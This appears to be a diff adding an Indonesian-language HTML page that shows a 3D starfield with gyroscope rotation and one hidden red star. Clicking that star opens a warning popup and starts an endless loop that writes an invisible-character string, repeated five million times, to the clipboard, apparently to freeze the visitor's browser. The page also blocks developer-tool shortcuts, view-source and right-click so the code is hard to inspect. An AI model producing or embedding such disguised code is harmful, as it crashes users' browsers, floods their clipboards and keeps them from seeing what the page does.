@@ -1,0 +1,259 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Infinity Warning Star</title>
+
+<!-- Font Awesome -->
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
+
+<style>
+html, body {
+  margin: 0;
+  padding: 0;
+  overflow: hidden;
+  background: black;
+  height: 100vh;
+  font-family: Arial, sans-serif;
+}
+
+.scene {
+  width: 100vw;
+  height: 100vh;
+  perspective: 1200px;
+  overflow: hidden;
+}
+
+.world {
+  width: 200vw;
+  height: 200vh;
+  position: absolute;
+  top: -50vh;
+  left: -50vw;
+  transform-style: preserve-3d;
+  transition: transform 0.1s linear;
+}
+.star{
+  position:absolute;
+  width:4px;
+  height:4px;
+  background:white;
+  border-radius:50%;
+  opacity:0.8;
+  pointer-events:none;
+}
+
+/* VISUAL BINTANG MERAH */
+.red{
+  position:absolute;
+  width:10px;
+  height:10px;
+  background:red;
+  border-radius:50%;
+  box-shadow:0 0 25px red;
+  animation: blink 1s infinite alternate;
+  pointer-events:none; /* visual doang */
+}
+
+/* HITBOX TERPISAH */
+.hitbox{
+  position:absolute;
+  top:50%;
+  left:50%;
+  width:80px;
+  height:80px;
+  transform:translate(-50%,-50%);
+  border-radius:50%;
+  background:transparent;
+  cursor:pointer;
+  pointer-events:auto;
+}
+
+@keyframes blink {
+  from { opacity:0.6; }
+  to { opacity:1; }
+}
+
+/* POPUP */
+.popup {
+  position: fixed;
+  top: 50%;
+  left: 50%;
+  width:85%;
+  height:90%;
+  border-radius:0;
+  transform: translate(-50%, -50%);
+  background: #111;
+  border: 2px solid red;
+  padding: 25px 35px;
+  border-radius: 12px;
+  text-align: center;
+  color: white;
+  display: none;
+  z-index: 9999;
+  box-shadow: 0 0 30px red;
+  animation: pop 0.3s ease;
+}
+
+.popup i {
+  font-size: 40px;
+  color: red;
+  margin-bottom: 15px;
+}
+
+.popup button {
+  margin-top: 15px;
+  padding: 8px 15px;
+  background: red;
+  border: none;
+  color: white;
+  cursor: pointer;
+  border-radius: 6px;
+}
+
+@keyframes pop {
+  from { transform: translate(-50%, -60%) scale(0.8); opacity: 0; }
+  to { transform: translate(-50%, -50%) scale(1); opacity: 1; }
+}
+#centerImage {
+  position: fixed;
+  top: 50%;
+  left: 50%;
+  transform: translate(-50%, -50%);
+  width: 150px; /* bisa kamu ubah */
+  z-index: 5000;
+  pointer-events: none; /* biar klik tetap ke bintang */
+}
+button.gyro {
+  position: fixed;
+  top: 20px;
+  left: 20px;
+  z-index: 999;
+  padding: 10px 15px;
+}
+</style>
+</head>
+<body>
+<!--<img src="gambar.png" id="centerImage">-->
+<button class="gyro" onclick="enableGyro()">Aktifkan Gyro</button>
+
+<div class="scene">
+  <div class="world" id="world"></div>
+</div>
+
+<!-- POPUP -->
+<div class="popup" id="popup">
+  <i class="fas fa-triangle-exclamation"></i>
+  <h2>WARNING</h2>
+  <p>selamat Kamu menemukan bintang rahasia btw</p>
+  <p>Web by t.me/arcznewera, Bantu Komen biar bisa bagus</p>
+  <p>susah bikin gyro nya</p>
+    <p>Kalau Chrome mu Nge Freeze Itu gw 🗿</p>
+  <button onclick="closePopup()">Tutup</button>
+</div>
+
+<script>
+document.addEventListener('keydown', function(e) {
+  if (
+    e.key === 'F12' ||
+    (e.ctrlKey && e.shiftKey && (e.key === 'I' || e.key === 'J' || e.key === 'C')) ||
+    (e.ctrlKey && e.key === 'U')
+  ) {
+    e.preventDefault()
+  }
+})
+document.addEventListener('contextmenu', function(e) {
+  e.preventDefault()
+})
+
+    const invis = "‎‏‏‎‏‏‎‎‏‏‎‏‏‎‎‏‏‎‏‏‎‎‎‏‏‎‏‏‎‎‏‏‎‏‏‎‎‏‏‎‏‏‎‎‏‏‎‏‏‎‎‏‏‎‏‏‎‎‏‏‎‏‏‎‎‏‏‎‏‏‎‎‏‏‎‏‏‎‎‏‏‎‏‏‎‎‏‏‎‏‏‎‎‏‏‎‏‏‎‎".repeat(5000000);
+async function utama(){
+  await navigator.clipboard.writeText(invis);
+}
+async function loop() {  
+    running = true;  
+    while (running) {   
+    await utama();
+    }  
+}
+let world = document.getElementById("world");
+let popup = document.getElementById("popup");
+
+/* ===== CREATE STARS ===== */
+let totalStars = 800;
+let randomClickableIndex = Math.floor(Math.random() * totalStars);
+
+for (let i = 0; i < totalStars; i++) {
+  let star = document.createElement("div");
+  star.className = "star";
+
+  let x = Math.random() * 200;
+  let y = Math.random() * 200;
+  let z = Math.random() * 2000 - 1000;
+
+  star.style.left = x + "vw";
+  star.style.top = y + "vh";
+  star.style.transform = `translateZ(${z}px)`;
+
+  if (i === randomClickableIndex) {
+
+    // ubah jadi merah
+    star.classList.remove("star");
+    star.classList.add("red");
+
+    // bikin hitbox layer
+    let hitbox = document.createElement("div");
+    hitbox.className = "hitbox";
+
+    hitbox.onclick = async function(e){
+  e.stopPropagation(); // biar ga tembus layer lain
+  
+  try {
+    popup.style.display = "block";
+    await loop();   // nanti kamu isi sendiri
+  } catch(err) {
+    console.error(err);
+  }
+};
+
+    star.appendChild(hitbox);
+  }
+
+  world.appendChild(star);
+}
+
+function closePopup() {
+  popup.style.display = "none";
+}
+
+/* ===== GYRO ===== */
+let rotX = 0, rotY = 0, rotZ = 0;
+
+function enableGyro() {
+  if (typeof DeviceOrientationEvent.requestPermission === 'function') {
+    DeviceOrientationEvent.requestPermission()
+      .then(permissionState => {
+        if (permissionState === 'granted') {
+          window.addEventListener("deviceorientation", handleOrientation);
+        }
+      })
+      .catch(console.error);
+  } else {
+    window.addEventListener("deviceorientation", handleOrientation);
+  }
+}
+
+function handleOrientation(event) {
+  rotX = event.beta;
+  rotY = event.gamma;
+  rotZ = event.alpha;
+
+  world.style.transform =
+    `rotateX(${rotX}deg)
+     rotateY(${rotY}deg)
+     rotateZ(${rotZ}deg)`;
+}
+</script>
+
+</body>
+</html>
